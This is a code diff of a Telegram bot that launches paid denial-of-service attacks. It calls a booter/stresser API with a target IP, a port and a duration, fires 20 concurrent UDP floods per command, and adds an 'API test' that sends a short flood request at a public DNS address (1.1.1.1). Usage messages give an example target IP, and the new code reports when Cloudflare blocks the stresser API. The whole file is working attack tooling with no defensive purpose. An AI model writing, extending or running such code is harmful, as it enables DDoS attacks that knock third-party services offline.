@@ -1,4 +1,4 @@
-# app.py - UDP ONLY Attack Bot (Fixed)
+# app.py - UDP Attack Bot with API Test
 import os
 import logging
 import asyncio
@@ -120,15 +120,52 @@ class AttackManager:
 
 attack_manager = AttackManager()
 
-# ===== UDP ONLY ATTACK =====
-async def send_udp_attack(target, port, duration, attack_num):
-    """
-    UDP ONLY attack via API
-    URL: https://api.susstresser.com/panel/api/api.php?key=KEY&host=HOST&port=PORT&time=TIME&method=udp
-    """
-    base_url = "https://api.susstresser.com/panel/api/api.php"
+# ===== TEST API CONNECTION =====
+async def test_api_connection():
+    """Test if API is reachable"""
+    url = "https://api.susstresser.com/panel/api/api.php"
+    params = {
+        "key": API_KEY,
+        "host": "1.1.1.1",
+        "port": 80,
+        "time": 10,
+        "method": "udp"
+    }
     
-    # UDP ONLY - method is always "udp"
+    headers = {
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+        "Accept-Encoding": "gzip, deflate",
+        "Connection": "keep-alive"
+    }
+    
+    try:
+        timeout = aiohttp.ClientTimeout(total=10)
+        async with aiohttp.ClientSession(timeout=timeout) as session:
+            start_time = time.time()
+            async with session.get(url, params=params, headers=headers) as response:
+                elapsed = time.time() - start_time
+                text = await response.text()
+                
+                return {
+                    "status": response.status,
+                    "elapsed": f"{elapsed:.2f}s",
+                    "response": text[:300],
+                    "is_cloudflare": "Cloudflare" in text or "Just a moment" in text,
+                    "success": response.status == 200
+                }
+    except Exception as e:
+        return {
+            "status": 0,
+            "error": str(e),
+            "success": False
+        }
+
+# ===== UDP ATTACK =====
+async def send_udp_attack(target, port, duration, attack_num):
+    """Send UDP attack via API"""
+    url = "https://api.susstresser.com/panel/api/api.php"
+    
     params = {
         "key": API_KEY,
         "host": target,
@@ -150,15 +187,23 @@ async def send_udp_attack(target, port, duration, attack_num):
         async with aiohttp.ClientSession(timeout=timeout) as session:
             start_time = time.time()
             
-            async with session.get(base_url, params=params, headers=headers) as response:
+            async with session.get(url, params=params, headers=headers) as response:
                 elapsed = time.time() - start_time
                 result_text = await response.text()
                 
-                # Log response for debugging
-                logger.info(f"Attack {attack_num}: Status {response.status}")
-                logger.info(f"Response: {result_text[:200]}")
+                # Check if it's Cloudflare
+                if "Cloudflare" in result_text or "Just a moment" in result_text:
+                    logger.warning(f"Attack {attack_num}: Cloudflare detected")
+                    return {
+                        "success": False,
+                        "attack_num": attack_num,
+                        "method": "UDP",
+                        "status": response.status,
+                        "elapsed": f"{elapsed:.2f}s",
+                        "error": "Cloudflare blocking"
+                    }
                 
-                # ANY 200 response is considered success for UDP attack
+                # Any 200 response is success
                 if response.status == 200:
                     return {
                         "success": True,
@@ -175,11 +220,10 @@ async def send_udp_attack(target, port, duration, attack_num):
                         "method": "UDP",
                         "status": response.status,
                         "elapsed": f"{elapsed:.2f}s",
-                        "response": result_text[:200] if result_text else "Failed"
+                        "error": f"HTTP {response.status}"
                     }
                     
     except asyncio.TimeoutError:
-        logger.error(f"Attack {attack_num} timed out")
         return {
             "success": False,
             "attack_num": attack_num,
@@ -187,7 +231,6 @@ async def send_udp_attack(target, port, duration, attack_num):
             "error": "Timeout"
         }
     except Exception as e:
-        logger.error(f"Attack {attack_num} failed: {e}")
         return {
             "success": False,
             "attack_num": attack_num,
@@ -195,7 +238,7 @@ async def send_udp_attack(target, port, duration, attack_num):
             "error": str(e)
         }
 
-# ===== 20 CONCURRENT UDP ATTACKS =====
+# ===== 20 CONCURRENT ATTACKS =====
 async def send_20_concurrent_attacks(target, port, duration):
     """Launch 20 concurrent UDP attacks"""
     logger.info(f"🚀 Launching 20 concurrent UDP attacks on {target}:{port}")
@@ -226,17 +269,16 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     keyboard = [
         [InlineKeyboardButton("💥 UDP ATTACK", callback_data="attack")],
         [InlineKeyboardButton("📊 STATUS", callback_data="status")],
+        [InlineKeyboardButton("🔬 TEST API", callback_data="test_api")],
     ]
     
     await update.message.reply_text(
         f"⚡ *UDP ATTACK BOT*\n\n"
         f"🔥 Status: ONLINE\n"
         f"⚡ Concurrent: {stats['concurrent_busy']}/{stats['max']}\n"
-        f"📊 Total Attacks: {stats['total']}\n"
-        f"🎯 Method: UDP ONLY\n\n"
-        f"📌 *Usage:* `/attack IP PORT TIME`\n\n"
+        f"📊 Total Attacks: {stats['total']}\n\n"
+        f"📌 *Usage:* `/attack IP PORT TIME`\n"
         f"Example: `/attack 91.108.17.19 32002 60`\n\n"
-        f"⚡ This launches 20 concurrent UDP attacks!\n"
         f"⏱️ Time: 60-300 seconds",
         reply_markup=InlineKeyboardMarkup(keyboard),
         parse_mode='Markdown'
@@ -254,7 +296,6 @@ async def attack_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text(
             "❌ *Usage:* `/attack IP PORT TIME`\n\n"
             "Example: `/attack 91.108.17.19 32002 60`\n\n"
-            "⚡ 20 concurrent UDP attacks!\n"
             "⏱️ Time: 60-300 seconds",
             parse_mode='Markdown'
         )
@@ -310,22 +351,38 @@ async def attack_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
                     if r.get('success'):
                         success_count += 1
                     status_code = r.get('status', 'N/A')
-                    response_text += f"{status} Attack {r.get('attack_num', 'N/A')}: UDP - {status_code}\n"
+                    response_text += f"{status} Attack {r.get('attack_num', 'N/A')}: {status_code}\n"
                 
                 if len(result['results']) > 10:
                     response_text += f"... and {len(result['results']) - 10} more\n"
                 
                 response_text += f"\n📊 Success Rate: {success_count}/{len(result['results'])}"
         else:
+            # Check if it's Cloudflare issue
+            error_msgs = []
+            for r in result.get('results', []):
+                if r.get('error'):
+                    error_msgs.append(r.get('error'))
+            
+            error_text = ""
+            if error_msgs:
+                unique_errors = list(set(error_msgs))
+                error_text = "\n".join([f"• {e}" for e in unique_errors[:3]])
+            
             response_text = (
                 f"❌ *UDP ATTACK FAILED*\n\n"
                 f"🎯 Target: `{target}`\n"
                 f"📡 Port: `{port}`\n"
                 f"⏱️ Time: `{duration}s`\n"
                 f"📊 Attack ID: `{attack_id}`\n"
-                f"⚡ Status: ❌ FAILED\n\n"
-                f"💡 Check API key or connection."
+                f"⚡ Status: ❌ FAILED"
             )
+            
+            if error_text:
+                response_text += f"\n\n📡 *Errors:*\n{error_text}"
+            
+            if "Cloudflare" in str(error_msgs):
+                response_text += "\n\n💡 *Cloudflare detected!*\nThe API is behind Cloudflare protection.\nContact API provider to whitelist your IP."
         
         await status_msg.edit_text(response_text, parse_mode='Markdown')
         attack_manager.stop_attack(attack_id)
@@ -344,7 +401,6 @@ async def attack_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
         "💥 *UDP ATTACK*\n\n"
         "Send: `IP PORT TIME`\n"
         "Example: `91.108.17.19 32002 60`\n\n"
-        "⚡ 20 concurrent UDP attacks!\n"
         "⏱️ Time: 60-300 seconds\n"
         "Send /cancel to cancel",
         parse_mode='Markdown'
@@ -427,6 +483,49 @@ async def process_attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
     
     context.user_data['awaiting_attack'] = False
 
+async def test_api_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Test API connection"""
+    query = update.callback_query
+    await query.answer()
+    
+    if query.from_user.id != OWNER_ID:
+        await query.answer("Access denied!", show_alert=True)
+        return
+    
+    await query.edit_message_text("🔬 Testing API connection...")
+    
+    result = await test_api_connection()
+    
+    if result.get('success'):
+        status_text = "✅ API is reachable!"
+    else:
+        status_text = "❌ API is NOT reachable!"
+    
+    response_text = (
+        f"🔬 *API TEST RESULTS*\n\n"
+        f"📡 Status: {result.get('status', 'N/A')}\n"
+        f"⏱️ Response Time: {result.get('elapsed', 'N/A')}\n"
+        f"🔑 API Key: `{API_KEY[:10]}...`\n"
+        f"📊 Result: {status_text}\n\n"
+    )
+    
+    if result.get('is_cloudflare'):
+        response_text += "⚠️ *Cloudflare detected!*\n"
+        response_text += "The API is behind Cloudflare protection.\n"
+        response_text += "💡 Contact API provider to whitelist your IP.\n\n"
+    
+    if result.get('response'):
+        response_text += f"📝 Response Preview:\n```\n{result['response'][:200]}\n```"
+    
+    if result.get('error'):
+        response_text += f"\n❌ Error: {result['error']}"
+    
+    await query.edit_message_text(
+        response_text,
+        parse_mode='Markdown',
+        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 BACK", callback_data="back")]])
+    )
+
 async def status_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query
     await query.answer()
@@ -439,7 +538,7 @@ async def status_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
         f"📊 Concurrent: {stats['concurrent_busy']}/{stats['max']}\n"
         f"📈 Total Attacks: {stats['total']}\n"
         f"🎯 Method: UDP ONLY\n"
-        f"🔑 API: {'✅ Connected' if API_KEY else '❌ No Key'}\n"
+        f"🔑 API: {'✅ Configured' if API_KEY else '❌ No Key'}\n"
         f"🌐 Status: ONLINE\n\n"
         f"📌 /attack IP PORT TIME",
         parse_mode='Markdown',
@@ -455,6 +554,7 @@ async def back_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
     keyboard = [
         [InlineKeyboardButton("💥 UDP ATTACK", callback_data="attack")],
         [InlineKeyboardButton("📊 STATUS", callback_data="status")],
+        [InlineKeyboardButton("🔬 TEST API", callback_data="test_api")],
     ]
     
     await query.edit_message_text(
@@ -485,6 +585,7 @@ def run_bot():
     
     app.add_handler(CallbackQueryHandler(attack_callback, pattern="^attack$"))
     app.add_handler(CallbackQueryHandler(status_callback, pattern="^status$"))
+    app.add_handler(CallbackQueryHandler(test_api_callback, pattern="^test_api$"))
     app.add_handler(CallbackQueryHandler(back_callback, pattern="^back$"))
     
     app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, process_attack))
